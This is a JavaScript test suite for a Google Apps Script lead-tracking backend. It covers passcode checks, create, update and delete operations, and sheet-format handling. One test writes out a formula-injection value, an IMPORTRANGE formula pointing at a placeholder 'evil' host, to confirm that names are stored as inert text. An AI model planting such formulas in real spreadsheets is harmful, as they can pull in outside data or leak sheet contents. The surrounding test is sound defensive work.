var assert = require("assert");
var fs = require("fs");
var path = require("path");
var load = require("./load-script");

var checks = 0;
function eq(actual, expected, label) {
  checks += 1;
  assert.deepStrictEqual(actual, expected, label || "");
}
function ok(value, label) {
  checks += 1;
  assert.ok(value, label || "");
}

var SECRET = "המשפט הסודי שלי";
var LEAD_ID = "11111111-2222-4333-8444-555555555555";

function post(loaded, payload) {
  return load.callScript(loaded, payload, "post").body;
}
function sheetRows(loaded) {
  var sh = loaded.spreadsheet.getSheetByName("פניות");
  return sh ? sh._rows : null;
}

function sample(extra) {
  return Object.assign({
    id: LEAD_ID,
    date: "2026-11-01",
    name: "דנה לוי",
    phone: "052-1234567",
    email: "dana@example.com",
    source: "חבר או מכר",
    detail: "קבוצת מנהלות",
    service: "ניהול יומן ומיילים",
    followUp: "2026-11-16",
    note: "להתקשר אחרי הצהריים",
    status: "חדש",
    meeting: false,
    package: "",
    lostReason: "",
    log: [],
    createdAt: 1000
  }, extra || {});
}

(function healthDoesNotLeak() {
  var loaded = load.loadAppsScript({ passcode: SECRET });
  var output = loaded.context.doGet({ parameter: {} });
  var body = JSON.parse(output.getContent());
  eq(body.ok, true);
  eq(body.service, "noy-leads");
  eq(body.leads, undefined);
  ok(body.message.indexOf("פעיל") >= 0);
  ok(output.getContent().indexOf(SECRET) < 0);
  eq(output.mime, "text/plain");
  eq(sheetRows(loaded), null);
})();

(function rejectsMissingAndWrongPasscode() {
  var empty = load.loadAppsScript({ passcode: "" });
  var missing = post(empty, { action: "list", passcode: SECRET });
  eq(missing.ok, false);
  eq(missing.error, "not_configured");
  eq(missing.leads, undefined);
  eq(sheetRows(empty), null);

  var loaded = load.loadAppsScript({ passcode: SECRET });
  ["", "לא", "המשפט הסודי שלה"].forEach(function(pass) {
    var res = post(loaded, { action: "list", passcode: pass });
    eq(res.ok, false);
    eq(res.error, "unauthorized");
    eq(res.leads, undefined);
    ok(JSON.stringify(res).indexOf(SECRET) < 0);
  });
  var created = post(loaded, { action: "create", passcode: "wrong-pass", lead: sample() });
  eq(created.error, "unauthorized");
  eq(sheetRows(loaded), null);
  eq(post(loaded, { action: "list", passcode: "  " + SECRET + "  " }).ok, true);
})();

(function scriptPropertyOverridesConstant() {
  var loaded = load.loadAppsScript({ passcode: "from-file", properties: { PASSCODE: "from-props" } });
  eq(post(loaded, { action: "list", passcode: "from-file" }).error, "unauthorized");
  eq(post(loaded, { action: "list", passcode: "from-props" }).ok, true);
})();

(function crudRoundTrip() {
  var loaded = load.loadAppsScript({ passcode: SECRET });
  var listed = post(loaded, { action: "list", passcode: SECRET });
  eq(listed.ok, true);
  eq(listed.leads, []);
  eq(sheetRows(loaded)[0], ["id", "date", "name", "phone", "email", "source", "detail", "service", "followUp", "note", "status", "meeting", "package", "lostReason", "log", "createdAt", "updatedAt"]);

  eq(post(loaded, { action: "create", passcode: SECRET, lead: { name: "", date: "2026-11-01" } }).error, "bad_request");
  eq(sheetRows(loaded).length, 1);

  var created = post(loaded, { action: "create", passcode: SECRET, lead: sample() });
  eq(created.ok, true);
  eq(created.id, LEAD_ID);
  eq(created.leads.length, 1);
  var lead = created.leads[0];
  eq(lead.name, "דנה לוי");
  eq(lead.phone, "052-1234567");
  eq(lead.meeting, false);
  eq(lead.status, "חדש");
  eq(lead.log, []);
  eq(lead.createdAt, 1000);
  ok(lead.updatedAt > 0);

  var rawName = sheetRows(loaded)[1][2];
  ok(String(rawName).charAt(0) === "'", "text prefix stored");
  eq(String(sheetRows(loaded)[1][1]).indexOf("2026-11-01") >= 0, true);
  ok(!(sheetRows(loaded)[1][1] instanceof Date));

  var again = post(loaded, { action: "create", passcode: SECRET, lead: sample({ name: "מישהי אחרת" }) });
  eq(again.leads.length, 1, "same id does not duplicate");
  eq(again.leads[0].name, "דנה לוי");

  var older = post(loaded, {
    action: "create",
    passcode: SECRET,
    lead: sample({ id: "22222222-2222-4333-8444-555555555555", name: "יוסי כהן", createdAt: 500, phone: "+972521112233" })
  });
  eq(older.leads.map(function(l) { return l.name; }), ["דנה לוי", "יוסי כהן"]);
  eq(older.leads[1].phone, "+972521112233");

  var patched = post(loaded, {
    action: "update",
    passcode: SECRET,
    id: LEAD_ID,
    patch: {
      status: "נסגר",
      package: "שוטפת",
      meeting: true,
      note: "עודכן",
      log: [{ t: 1700000000000, text: "שיחה ראשונה" }],
      id: "should-not-change",
      createdAt: 1
    }
  });
  var dana = patched.leads.filter(function(l) { return l.id === LEAD_ID; })[0];
  eq(dana.status, "נסגר");
  eq(dana.package, "שוטפת");
  eq(dana.meeting, true);
  eq(dana.note, "עודכן");
  eq(dana.phone, "052-1234567");
  eq(dana.createdAt, 1000);
  eq(dana.id, LEAD_ID);
  eq(dana.log, [{ t: 1700000000000, text: "שיחה ראשונה" }]);

  var kept = post(loaded, { action: "update", passcode: SECRET, id: LEAD_ID, patch: { status: "לא קיים", followUp: "" } });
  dana = kept.leads.filter(function(l) { return l.id === LEAD_ID; })[0];
  eq(dana.status, "נסגר");
  eq(dana.followUp, "");

  eq(post(loaded, { action: "update", passcode: SECRET, id: LEAD_ID, patch: { name: "   " } }).error, "bad_request");
  eq(post(loaded, { action: "update", passcode: SECRET, id: "missing1", patch: { note: "x" } }).error, "not_found");

  var removed = post(loaded, { action: "delete", passcode: SECRET, id: "22222222-2222-4333-8444-555555555555" });
  eq(removed.leads.map(function(l) { return l.name; }), ["דנה לוי"]);
  var removedAgain = post(loaded, { action: "delete", passcode: SECRET, id: "22222222-2222-4333-8444-555555555555" });
  eq(removedAgain.ok, true);
  eq(removedAgain.leads.length, 1);

  var viaGet = load.callScript(loaded, { action: "list", passcode: SECRET }, "get").body;
  eq(viaGet.leads.length, 1);
  eq(viaGet.leads[0].log[0].text, "שיחה ראשונה");
})();

(function formulaAndDateSafety() {
  var loaded = load.loadAppsScript({ passcode: SECRET });
  var evil = '=IMPORTRANGE("https://evil","A1")';
  var created = post(loaded, { action: "create", passcode: SECRET, lead: sample({ name: evil, phone: "0520000000" }) });
  eq(created.leads[0].name, evil);
  ok(String(sheetRows(loaded)[1][2]).indexOf("=") === 1);
  sheetRows(loaded)[1][1] = new Date("2026-11-16T22:30:00Z");
  var listed = post(loaded, { action: "list", passcode: SECRET });
  eq(listed.leads[0].date, "2026-11-17");
})();

(function badSheetAndBadJson() {
  var loaded = load.loadAppsScript({ passcode: SECRET });
  post(loaded, { action: "list", passcode: SECRET });
  sheetRows(loaded)[0][0] = "שם";
  eq(post(loaded, { action: "list", passcode: SECRET }).error, "bad_sheet");
  var broken = loaded.context.doPost({ postData: { contents: "{", type: "text/plain" } });
  eq(JSON.parse(broken.getContent()).error, "bad_request");
  eq(post(loaded, { action: "dance", passcode: SECRET }).error, "bad_request");
  loaded.context.SpreadsheetApp.getActiveSpreadsheet = function() { return null; };
  eq(post(loaded, { action: "list", passcode: SECRET }).error, "no_sheet");
})();

(function pageHasNoClaudeAndNoSecret() {
  var html = fs.readFileSync(path.join(__dirname, "..", "index.html"), "utf8");
  var readme = fs.readFileSync(path.join(__dirname, "..", "README.md"), "utf8");
  ok(html.indexOf("window.claude") < 0);
  ok(html.indexOf("claude") < 0);
  ok(html.indexOf("text/plain;charset=utf-8") >= 0);
  ok(html.indexOf("Authorization") < 0);
  ok(html.indexOf("application/json") < 0);
  ok(html.indexOf("noy-office-webapp-url") >= 0);
  ok(html.indexOf("AKfyc") < 0);
  ok(readme.indexOf("כל המשתמשים") >= 0);
  ok(readme.indexOf("PASSCODE") >= 0);
  ok(readme.indexOf("/exec") >= 0);
  var script = html.split("<script>")[1].split("</script>")[0];
  new Function(script);
})();

console.log("apps-script tests ok (" + checks + " checks)");
